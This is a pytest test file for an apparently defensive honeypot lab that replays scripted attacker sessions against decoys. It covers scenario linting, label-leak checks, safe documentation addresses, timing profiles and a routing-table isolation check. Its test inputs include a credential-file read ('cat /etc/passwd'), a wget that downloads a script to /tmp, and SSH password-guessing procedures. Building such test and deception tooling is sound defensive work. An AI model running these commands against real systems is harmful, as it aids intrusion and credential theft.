"""Scenario runner: lint, safety check, addresses, timing, and the reaction logic.

Nothing here opens a connection: the engine runs against a scripted driver, and the safety
check is fed routing tables as text.
"""

from __future__ import annotations

import json
import random
import re
from datetime import UTC, datetime
from pathlib import Path
from typing import ClassVar

import pytest
import yaml

from mirage_decoy_common.proxyproto import parse_header
from mirage_lab import safety
from mirage_lab.drivers.base import AuthPhase, LoginResult, Result
from mirage_lab.models import Catalogue, Scenario, check_input, lint
from mirage_lab.net import RANGES, AddressPool, Conn, Dialer, proxy_v2
from mirage_lab.runner import ActorRun, Settings
from mirage_lab.slots import Slots
from mirage_lab.timing import BACKSPACE, make
from mirage_lab.truth import TruthWriter
from mirage_schema.groundtruth import input_hash, parse_record

ROOT = Path(__file__).resolve().parents[2]
CATALOGUE = Catalogue.load(ROOT / "lab/catalogue")


def scenario(doc: str) -> Scenario:
    return Scenario.model_validate(yaml.safe_load(doc))


BASE = """
id: test-one
actor: {class: scripted_bot, timing: bot-fast, patience: 1}
sessions:
  - protocol: ssh
    channel: exec
    login: {user: root, guesses: 2, procedure: ssh-password-guessing}
    steps:
      - {id: a, procedure: sysinfo-uname-all, expect: "Linux", on_fail: leave}
      - {id: b, procedure: probe-missing-tool, expect_status: 0, on_fail: {goto: d}}
      - {id: c, procedure: files-list-dir}
      - {id: d, procedure: owner-id, expect: "uid=", on_fail: retry, retries: 2}
      - {id: e, procedure: transfer-sftp-put}
"""

# ------------------------------------------------------------------ lint


def test_shipped_scenarios_pass_the_lint():
    paths = sorted((ROOT / "lab/scenarios").rglob("*.yaml"))
    assert paths
    for path in paths:
        assert lint(Scenario.load(path), CATALOGUE, Slots.names()) == [], path


@pytest.mark.parametrize(
    ("text", "word"),
    [
        ("echo T1059.004", "ATT&CK"),
        ("curl http://x/TA0003", "ATT&CK"),
        ("echo mirage-test", "marker"),
        ("wget http://atomic.example/a", "marker"),
        ("uname -a ", "one line"),
        ("id\nwhoami", "one line"),
        ("echo sysinfo-uname-all", "ID"),
    ],
)
def test_inputs_that_would_leak_the_label_are_refused(text, word):
    problems = check_input(text, ("sysinfo-uname-all",))
    assert problems and word in problems[0]


def test_ordinary_inputs_pass():
    for text in ("uname -a", "cat /etc/passwd", "wget http://192.0.2.7/x.sh -O /tmp/x.sh"):
        assert check_input(text, ("some-procedure", "s1")) == []


def test_lint_catches_structure_errors():
    def problems(doc: str, **kw) -> str:
        return " | ".join(lint(scenario(doc), CATALOGUE, Slots.names(), **kw))

    assert problems(BASE) == ""
    assert "unknown procedure" in problems(BASE.replace("owner-id", "no-such"))
    assert "must name a later step" in problems(BASE.replace("goto: d", "goto: a"))
    assert "needs an exec channel" in problems(BASE.replace("channel: exec", "channel: shell"))
    assert "belongs under login" in problems(
        BASE.replace("files-list-dir", "ssh-password-guessing")
    )
    assert "does not have" in problems(
        BASE.replace("procedure: owner-id", "procedure: owner-id, with: {dir: /x}")
    )
    # a scenario may only use procedures from one split (spec section 5, check 2)
    split = dict.fromkeys(CATALOGUE.procedures, "train")
    assert problems(BASE, splits=split) == ""
    assert "mixes splits" in problems(BASE, splits={**split, "owner-id": "test"})
    del split["owner-id"]
    assert "no split" in problems(BASE, splits=split)


def test_catalogue_rejects_inconsistent_procedures(tmp_path):
    def load(body: str) -> Catalogue:
        (tmp_path / "c.yaml").write_text(body)
        return Catalogue.load(tmp_path)

    head = 'attack_version: "20.1"\nprocedures:\n'
    ok = head + "  - {id: proc-one, source: own, protocol: ssh, template: ls}\n"
    assert load(ok).procedures["proc-one"].technique is None
    with pytest.raises(ValueError, match="together"):
        load(
            head
            + "  - {id: proc-one, technique: T1082, source: own, protocol: ssh, template: ls}\n"
        )
    with pytest.raises(ValueError, match="template"):
        load(head + "  - {id: proc-one, source: own, protocol: ssh}\n")
    with pytest.raises(ValueError, match="twice"):
        load(ok + "  - {id: proc-one, source: own, protocol: ssh, template: id}\n")


# ------------------------------------------------------------------ slots and timing


def test_slots_are_inert_stable_and_seeded():
    a, b = Slots(random.Random(7)), Slots(random.Random(7))
    names = ["host", "file", "file2", "url", "ip", "domain", "path", "hex", "port", "user"]
    assert a.fill(names, {}) == b.fill(names, {})
    assert a.get("file") == a.get("file") != a.get("file2")
    assert a.fill(["file"], {"file": "fixed.sh"}) == {"file": "fixed.sh"}
    for seed in range(200):
        s = Slots(random.Random(seed))
        ip, domain, url = s.get("ip"), s.get("domain"), s.get("url")
        assert ip.rsplit(".", 1)[0] in ("192.0.2", "198.51.100", "203.0.113")
        assert domain.rsplit(".", 1)[1] in ("example", "test", "invalid")
        host = re.match(r"http://([^/]+)/", url).group(1)
        assert host.rsplit(".", 1)[1] in ("example", "test", "invalid") or host.startswith(
            ("192.0.2.", "198.51.100.", "203.0.113.")
        )
        for name in names:
            assert check_input(s.get(name)) == [], (name, s.get(name))


def test_timing_profiles():
    bot = make("bot-fast", random.Random(1))
    assert list(bot.strokes("uname -a")) == [("uname -a", 0.0)]
    assert 0 < bot.gap() < 2
    human = make("human", random.Random(1))
    strokes = list(human.strokes("cat /etc/passwd && echo done"))
    typed = ""
    for text, pause in strokes:
        assert pause > 0
        typed = typed[:-1] if text == BACKSPACE else typed + text
    assert typed == "cat /etc/passwd && echo done"  # corrections leave the intended line
    assert human.gap(1500) > human.gap(0) * 0  # reading time is added, never negative
    assert make("human", random.Random(1), scale=0.01).describe() == "human@0.01"
    # two actors of one profile differ
    assert make("human", random.Random(1)).key_median != make("human", random.Random(2)).key_median
    with pytest.raises(ValueError):
        make("warp", random.Random(1))


# ------------------------------------------------------------------ network and safety


def test_proxy_header_is_what_the_decoys_parse():
    header = proxy_v2("198.18.0.7", 40123, "172.26.0.2", 2222)
    info = parse_header(header[:16], header[16:])
    assert (info.src_ip, info.src_port, info.dst_ip, info.dst_port) == (
        "198.18.0.7", 40123, "172.26.0.2", 2222,
    )  # fmt: skip


def test_address_pool_never_repeats_and_stays_in_its_range(tmp_path):
    pool = AddressPool(tmp_path / "addresses.capture", "capture")
    first, second = pool.take(3), pool.take(2)
    assert first == ["198.18.0.1", "198.18.0.2", "198.18.0.3"]
    assert second == ["198.18.0.4", "198.18.0.5"]
    explore = AddressPool(tmp_path / "addresses.explore", "explore").take(300)
    assert len(set(explore)) == 300
    assert all(__import__("ipaddress").ip_address(a) in RANGES["explore"] for a in explore)
    assert not set(explore) & set(first + second)


LAB_ROUTES = (
    "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
    "eth0\t00001AAC\t00000000\t0001\t0\t0\t0\t0000FFFF\t0\t0\t0\n"
)
DEFAULT_ROUTE = "eth0\t00000000\t01001AAC\t0003\t0\t0\t0\t00000000\t0\t0\t0\n"
V6_DEFAULT = (
    "00000000000000000000000000000000 00 00000000000000000000000000000000 00 "
    "fe800000000000000000000000000001 00000400 00000001 00000000 00000003     eth0\n"
)
V6_LO = V6_DEFAULT.replace("eth0", "lo")


def test_safety_check_accepts_only_an_isolated_lab():
    assert safety.check_target(["172.26.0.2"], LAB_ROUTES, "") == []
    assert safety.check_target(["172.26.0.2"], LAB_ROUTES, V6_LO) == []

    def why(addresses, r4=LAB_ROUTES, r6=""):
        return " | ".join(safety.check_target(addresses, r4, r6))

    assert "outside the lab network" in why(["93.184.216.34"])
    assert "outside the lab network" in why(["172.27.0.2"])
    assert "outside the lab network" in why(["172.26.0.2", "10.9.9.9"])  # every address counts
    assert "does not resolve" in why([])
    assert "IPv4 default route" in why(["172.26.0.2"], LAB_ROUTES + DEFAULT_ROUTE)
    assert "IPv6 default route" in why(["172.26.0.2"], LAB_ROUTES, V6_DEFAULT)
    two = LAB_ROUTES + "eth1\t0000140A\t00000000\t0001\t0\t0\t0\t0000FFFF\t0\t0\t0\n"
    assert "exactly one attached private network" in why(["172.26.0.2"], two)
    public = LAB_ROUTES.replace("00001AAC", "00000808")
    assert "exactly one attached private network" in why(["8.8.0.2"], public)


def test_runner_refuses_to_start_outside_its_container(monkeypatch, tmp_path):
    monkeypatch.setattr(safety, "ROUTE4", tmp_path / "absent")
    with pytest.raises(safety.SafetyError, match="only runs in its lab container"):
        safety.require_lab("lab-edge")


# ------------------------------------------------------------------ the engine


class Scripted:
    """A driver that answers from a table instead of a network."""

    answers: ClassVar[dict[str, tuple[str, int]]] = {}
    die_after: int | None = None
    login_ok = True

    def __init__(self, dialer, timing, fingerprint, user, password, channel):
        self.dialer, self.sent = dialer, []
        self.conn = Conn(None, dialer.src_ip, 40001, dialer.target_ip, 2222, datetime.now(UTC))
        dialer.opened.append(self.conn)

    def login(self, guesses):
        t = datetime.now(UTC)
        return LoginResult(self.login_ok, [AuthPhase(self.conn, t, t, guesses + 1, self.login_ok)])

    def _result(self, text, sha):
        self.sent.append(text)
        out, status = next((v for k, v in self.answers.items() if re.search(k, text)), ("", 0))
        alive = self.die_after is None or len(self.sent) < self.die_after
        t = datetime.now(UTC)
        return Result(True, out, status, alive, self.conn, t, t, sha)

    def run(self, line):
        return self._result(line, input_hash(line))

    def upload(self, path, data):
        return self._result(f"PUT {path}", input_hash(data))

    def close(self):
        pass


def run_actor(tmp_path, doc=BASE, **driver_attrs) -> tuple[list[dict], list[str]]:
    driver = type("D", (Scripted,), driver_attrs)
    truth = TruthWriter(tmp_path / "gt.json")
    settings = Settings(
        target_ip="172.26.0.2", out_dir=tmp_path, profile_dir=tmp_path, time_scale=0
    )
    (tmp_path / "cowrie").mkdir(exist_ok=True)
    (tmp_path / "cowrie/userdb.txt").write_text("root:x:secret-pw\n")
    actor = ActorRun(scenario(doc), 0, "198.18.0.9", "r1", CATALOGUE, settings, truth)
    made = []

    def factory(*a):
        made.append(driver(*a))
        return made[-1]

    actor.driver_factory = factory
    actor.run()
    truth.close()
    records = [json.loads(line) for line in (tmp_path / "gt.json").read_text().splitlines()]
    for r in records:
        parse_record(r)  # every record is valid schema
    return records, made[0].sent


def steps_of(records) -> dict[str, tuple[str, str]]:
    return {r["step_id"]: (r["status"], r["outcome"]) for r in records if r["kind"] == "step"}


GOOD = {r"^uname": ("Linux host 6.1\n", 0), r"^id$": ("uid=0(root)\n", 0)}


def test_engine_happy_path_records_every_step(tmp_path):
    records, sent = run_actor(tmp_path, answers=GOOD)
    assert steps_of(records) == {
        "login-0": ("ran", "ok"),
        "a": ("ran", "ok"),
        "b": ("ran", "ok"),
        "c": ("ran", "unchecked"),
        "d": ("ran", "ok"),
        "e": ("ran", "unchecked"),
    }
    assert sent[0] == "uname -a" and sent[-1].startswith("PUT /tmp/")
    (session,) = [r for r in records if r["kind"] == "session"]
    assert session["actor_class"] == "scripted_bot" and session["mode"] == "capture"
    assert session["connections"][0]["src"] == {
        "ip": "198.18.0.9", "pseudonym": None, "port": 40001, "asn": None, "country": None,
    }  # fmt: skip
    by_id = {r["step_id"]: r for r in records if r["kind"] == "step"}
    assert by_id["a"]["input_sha256"] == input_hash("uname -a")
    assert by_id["a"]["technique_id"] == "T1082" and by_id["a"]["evidence"] == "input"
    assert by_id["e"]["evidence"] == "upload" and by_id["e"]["technique_id"] == "T1105"
    assert by_id["login-0"]["evidence"] == "auth" and by_id["login-0"]["input_sha256"] is None
    assert by_id["b"]["technique_id"] is None  # an explicit negative


def test_session_source_and_actor_overrides(tmp_path):
    """A session can dial from its own simulated address with its own actor class (the demo
    that reuses stolen credentials needs both)."""
    doc = (
        BASE
        + """
  - protocol: ssh
    channel: exec
    source: 2
    actor: {class: scanner, timing: scan}
    login: {user: root}
    steps:
      - {id: f, procedure: sysinfo-uname-all}
"""
    )
    records, _sent = run_actor(tmp_path, doc=doc, answers=GOOD)
    sessions = [r for r in records if r["kind"] == "session"]
    assert [s["actor_class"] for s in sessions] == ["scripted_bot", "scanner"]
    assert [s["timing_profile"].split("@")[0] for s in sessions] == ["bot-fast", "scan"]
    addresses = {c["src"]["ip"] for s in sessions for c in s["connections"]}
    assert len(addresses) == 2  # the second session dialled from its own address
    steps = steps_of(records)
    assert steps["f"] == ("ran", "unchecked")


def test_engine_goto_skips_and_records_the_skipped_step(tmp_path):
    answers = {**GOOD, r"--version$": ("bash: x: command not found\n", 127)}
    records, sent = run_actor(tmp_path, answers=answers)
    got = steps_of(records)
    assert got["b"] == ("ran", "failed") and got["c"] == ("skipped", "unchecked")
    assert got["d"] == ("ran", "ok") and got["e"] == ("ran", "unchecked")
    assert not any(s.startswith("ls -la") for s in sent)


def test_engine_leaves_when_the_host_looks_wrong(tmp_path):
    records, sent = run_actor(tmp_path, answers={r"^uname": ("FreeBSD\n", 0)})
    got = steps_of(records)
    assert got["a"] == ("ran", "failed")
    assert all(got[s] == ("skipped", "unchecked") for s in "bcde")
    assert sent == ["uname -a"]


def test_engine_retries_then_runs_out_of_patience(tmp_path):
    answers = {r"^uname": ("Linux\n", 0), r"^id$": ("permission denied\n", 1)}
    records, sent = run_actor(tmp_path, answers=answers)
    got = steps_of(records)
    # d fails, is retried once (patience 1 allows one failure), fails again, and the actor leaves
    assert got["d"] == ("ran", "failed") and got["d~2"] == ("ran", "failed")
    assert got["e"] == ("skipped", "unchecked")
    assert sent.count("id") == 2


def test_engine_stops_when_the_decoy_ends_the_session(tmp_path):
    records, sent = run_actor(tmp_path, answers=GOOD, die_after=2)
    got = steps_of(records)
    assert got["a"][0] == "ran" and got["b"][0] == "ran"
    assert all(got[s][0] == "skipped" for s in "cde")
    assert len(sent) == 2


def test_login_steps_take_each_connection_s_own_outcome(tmp_path):
    # Regression guard for the review's #3: all login steps were marked ok/failed by login.ok.
    from datetime import UTC, datetime

    from mirage_lab.drivers.base import AuthPhase, LoginResult

    class TwoPhase(Scripted):
        def login(self, guesses):
            t = datetime.now(UTC)
            c2 = Conn(None, self.dialer.src_ip, 40002, self.dialer.target_ip, 2222, t)
            self.dialer.opened.append(c2)
            # first connection's guesses all fail, second connection succeeds
            return LoginResult(
                True, [AuthPhase(self.conn, t, t, 3, False), AuthPhase(c2, t, t, 1, True)]
            )

    doc = BASE.replace("guesses: 2", "guesses: 5")
    driver = type("D2", (TwoPhase,), {"answers": GOOD})
    truth = TruthWriter(tmp_path / "gt.json")
    settings = Settings(
        target_ip="172.26.0.2", out_dir=tmp_path, profile_dir=tmp_path, time_scale=0
    )
    (tmp_path / "cowrie").mkdir(exist_ok=True)
    (tmp_path / "cowrie/userdb.txt").write_text("root:x:secret-pw\n")
    actor = ActorRun(scenario(doc), 0, "198.18.0.9", "r1", CATALOGUE, settings, truth)
    actor.driver_factory = lambda *a: driver(*a)
    actor.run()
    truth.close()
    recs = [json.loads(line) for line in (tmp_path / "gt.json").read_text().splitlines()]
    login = {
        r["step_id"]: r["outcome"]
        for r in recs
        if r["kind"] == "step" and r["step_id"].startswith("login")
    }
    assert login == {"login-0": "failed", "login-1": "ok"}


def test_engine_failed_login_skips_everything(tmp_path):
    records, sent = run_actor(tmp_path, login_ok=False)
    got = steps_of(records)
    assert got["login-0"] == ("ran", "failed")
    assert all(got[s][0] == "skipped" for s in "abcde") and sent == []


def test_dialer_gives_every_connection_its_own_port(monkeypatch):
    sent = []

    class FakeSock:
        def setsockopt(self, *a):
            pass

        def sendall(self, data):
            sent.append(data)

    monkeypatch.setattr("mirage_lab.net.socket.create_connection", lambda *a, **k: FakeSock())
    d = Dialer("172.26.0.2", "198.18.0.9", random.Random(3))
    ports = [d.connect(2222).src_port for _ in range(50)]
    assert len(set(ports)) == 50 and all(32768 <= p <= 60999 for p in ports)
    info = parse_header(sent[0][:16], sent[0][16:])
    assert (info.src_ip, info.src_port) == ("198.18.0.9", ports[0])
